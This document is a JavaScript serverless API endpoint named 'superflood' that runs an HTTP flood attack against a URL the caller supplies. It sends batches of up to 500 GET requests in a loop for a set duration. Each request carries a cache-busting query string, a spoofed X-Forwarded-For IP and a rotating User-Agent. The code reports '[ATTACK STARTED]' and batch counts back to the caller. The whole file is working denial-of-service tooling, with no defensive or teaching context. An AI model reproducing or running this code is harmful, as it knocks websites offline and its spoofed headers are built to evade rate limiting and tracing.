// /api/superflood.js
export default async function handler(req, res) {
    // CORS for local dev
    res.setHeader('Access-Control-Allow-Origin', '*');
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const { target, intensity = 50, duration = 30000 } = req.body;
    if (!target) return res.status(400).json({ error: 'Missing target' });

    // Immediately respond to client but keep connection alive
    res.writeHead(200, {
        'Content-Type': 'text/plain',
        'Connection': 'keep-alive',
        'Cache-Control': 'no-cache'
    });
    res.write('[ATTACK STARTED]\n');

    const endTime = Date.now() + duration;
    const batchSize = Math.min(intensity * 10, 500); // limit per batch

    const fetchWithTimeout = (url, options, timeout=2000) => {
        return Promise.race([
            fetch(url, options),
            new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), timeout))
        ]);
    };

    const attackLoop = async () => {
        while (Date.now() < endTime) {
            const promises = [];
            for (let i = 0; i < batchSize; i++) {
                const randomUrl = target + (target.includes('?') ? '&' : '?') + '_=' + Math.random() + Date.now();
                const headers = {
                    'X-Forwarded-For': `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`,
                    'User-Agent': `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(Math.random()*50+70)}.0.0.0 Safari/537.36`,
                    'Accept': '*/*',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Cache-Control': 'no-cache, no-store, must-revalidate',
                    'Pragma': 'no-cache',
                    'Connection': 'keep-alive'
                };
                promises.push(
                    fetchWithTimeout(randomUrl, { 
                        method: 'GET', 
                        headers, 
                        cache: 'no-store',
                        keepalive: true 
                    }).catch(() => null)
                );
            }
            await Promise.allSettled(promises);
            res.write(`[BATCH] ${batchSize} requests sent\n`);
            // small delay to avoid v8 event loop starvation
            await new Promise(r => setTimeout(r, 10));
        }
        res.end('[ATTACK FINISHED]');
    };

    attackLoop().catch(err => {
        console.error(err);
        res.end('[ERROR] ' + err.message);
    });
}
